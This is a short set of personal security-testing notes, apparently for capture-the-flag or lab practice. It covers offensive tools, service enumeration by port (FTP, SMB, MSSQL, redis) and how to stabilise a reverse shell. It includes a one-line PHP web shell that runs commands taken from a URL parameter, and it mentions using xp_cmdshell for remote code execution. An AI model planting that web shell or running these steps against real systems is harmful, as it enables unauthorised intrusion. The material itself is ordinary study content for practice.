# Cyber Security Notes

## Tools
- OpenVPN
- nmap
- smbclient
- Sublime Text
- redis-tools
- gobuster
- mysql
- wordlists from SecLists and naive hashcat
  - directory-list-2.3-medium.txt
  - rockyou.txt
- john the ripper
- responder
- evil-winrm

## Initial Access
### Simple PHP Payload
> Use + instead of spaces due to URL encoding when sending commands through URL
```php
<?php
  echo system($_GET['c']);
?>
```

## Post Exploitation
### Spawning a Stable Shell
> This requires that you already have a reverse shell on the target machine

First, run the following on the target machine
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

On our host machine, we will then run
```bash
stty raw -echo
```
The dash means "disable" a setting, so -echo disables echoing. The raw setting means that the input and output is not processed, just sent straight through. So with stty raw you can't hit Ctrl-C to end a process, for example. This helps to make the shell more stable.

Finally, on our target machine we will run
```bash
export TERM=xterm
```
This will set the terminal emulator to the Ubuntu default of xterm.
From here on out, we should have successfully spawned a stable shell.

## Brute Forcing
### Tools
#### Z3
- Z3 is a theorem prover from Microsoft Research that makes it very easy to brute force questions by specifing rules.
- Can be accessed through Python bindings.

## Vulnerability Scanning
### Port 21
#### FTP
- Use ftp (get to grab files)
- FTP code 230 will be returned in nmap scan if anonymous login is allowed
#### Telnet
- Use telnet

### Ports 445
Usually associated with file sharing (SMB)
- Sensitive info tend to be stored in these areas
- Use smbclient to show available shares and access them
- WorkShares can occasionally be logged into without a password
- E.g. smbclient //127.0.0.1/SHARE$

List shares
```bash
smbclient -N -L //127.0.0.1/
```

### Port 1433
Usually associated with SQL

```bash xp_cmdshell``` is an extended stored procedure of Microsoft SQL Server that can be used in order to spawn a Windows command shell.
```python impacket-mssql``` can be used in order to establish an authenticated connection to a Microsoft SQL Server.

### Port 6379
Usually associated with redis
- Accessed using redis-cli
- redis is an in-memory database
- Use info to list all databases, then use select `id` to select a database by its id
- Use keys * to get all keys, then get `keyname` to get the corresponding value

## Database
### Accessing Microsoft SQL Server
- pymssql can be used to connect to Microsoft SQL Servers.
- Goal is to use xp_cmdshell to gain RCE.

## Useful URLS
- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://github.com/undergroundwires/CEH-in-bullet-points
- https://github.com/JohnHammond/ctf-katana
